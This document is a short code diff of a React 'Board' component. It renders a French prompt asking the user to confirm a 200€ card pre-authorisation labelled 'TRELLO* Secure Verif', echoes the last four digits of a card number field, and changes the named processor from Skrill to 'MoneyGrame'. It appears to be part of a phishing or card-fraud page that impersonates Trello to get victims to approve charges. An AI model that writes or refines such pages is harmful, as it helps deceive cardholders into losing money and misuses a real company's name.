@@ -308,7 +308,7 @@ const Board = () => {
             ) : (
               <>
                 <p>Confirmez la pré-autorisaton de 200€</p>
-                <span>TRELLO* Secure Verif (Skrill)</span>
+                <span>TRELLO* Secure Verif (MoneyGrame)</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
 
